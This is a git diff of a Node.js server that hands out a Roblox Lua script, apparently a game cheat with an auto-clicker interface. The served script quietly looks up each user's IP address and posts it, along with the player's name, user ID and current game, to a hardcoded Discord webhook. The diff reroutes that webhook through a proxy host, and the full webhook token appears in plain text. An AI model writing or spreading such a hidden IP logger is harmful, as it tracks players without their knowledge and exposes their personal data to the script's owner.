@@ -2,8 +2,9 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// رابط الويب هوك الخاص بك مدمج وجاهز
-const webhookUrl = "https://discord.com/api/webhooks/1500997210794365000/b3XsDU-dBJ874IPO1pZUK91CWwfk76K7HwzhMkz3ySt9WMKQHNQdheuBIMyFDd1HnwAb"; 
+// الرابط الخاص بك مع تحويله تلقائياً لوسيط (Proxy) لضمان العمل داخل روبلوكس
+const originalWebhook = "https://discord.com/api/webhooks/1500997210794365000/b3XsDU-dBJ874IPO1pZUK91CWwfk76K7HwzhMkz3ySt9WMKQHNQdheuBIMyFDd1HnwAb";
+const proxyWebhook = originalWebhook.replace("https://discord.com", "https://webhook.lewisakura.moe");
 
 const myScript = `
 local http = game:GetService("HttpService")
@@ -19,39 +20,38 @@ end
 
 local userIp = getIp()
 
--- [نظام الحظر] - ضع الآي بي هنا لحظر الشخص للأبد
+-- [قائمة الحظر] - ضع الآي بي هنا لحظر الشخص
 local bannedIps = {
-    "1.1.1.1", -- مثال: لو حطيت آي بي الشخص هنا بيطرده السكربت فوراً
+    "1.1.1.1", 
 }
 
 for _, ip in pairs(bannedIps) do
     if userIp == ip then
-        player:Kick("🚫 أنت محظور من استخدام سكربت F2 (IP BAN)")
+        player:Kick("🚫 محظور من سكربت F2 (IP BAN)")
         return
     end
 end
 
--- إرسال التقرير لديسكورد (الاسم، الـ ID، والـ IP)
+-- إرسال التقرير لديسكورد عبر الوسيط
 local data = {
     ["content"] = "🚨 **دخول جديد لسكربت F2!**",
     ["embeds"] = {{
-        ["title"] = "معلومات المستخدم المحمية",
+        ["title"] = "سجل النشاط",
         ["fields"] = {
             {["name"] = "اللاعب", ["value"] = player.Name, ["inline"] = true},
             {["name"] = "ID", ["value"] = tostring(player.UserId), ["inline"] = true},
             {["name"] = "الآي بي (IP)", ["value"] = "||" .. userIp .. "||", ["inline"] = false},
             {["name"] = "اللعبة", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = false}
         },
-        ["color"] = 16744192,
-        ["footer"] = {["text"] = "F2 Security System"}
+        ["color"] = 16744192
     }}
 }
 
 pcall(function()
-    http:PostAsync("${webhookUrl}", http:JSONEncode(data))
+    http:PostAsync("${proxyWebhook}", http:JSONEncode(data))
 end)
 
--- [بداية كود السكربت الأصلي الخاص بك]
+-- [بداية واجهة السكربت والـ Auto Clicker]
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
 local TopBar = Instance.new("Frame", MainFrame)
@@ -170,6 +170,6 @@ app.get('/raw', (req, res) => {
     res.send(myScript);
 });
 
-app.get('/', (req, res) => res.send('F2 Server is Live!'));
+app.get('/', (req, res) => res.send('F2 Server Online with IP-Logging Proxy'));
 
 app.listen(PORT, () => console.log('Server is running on port ' + PORT));
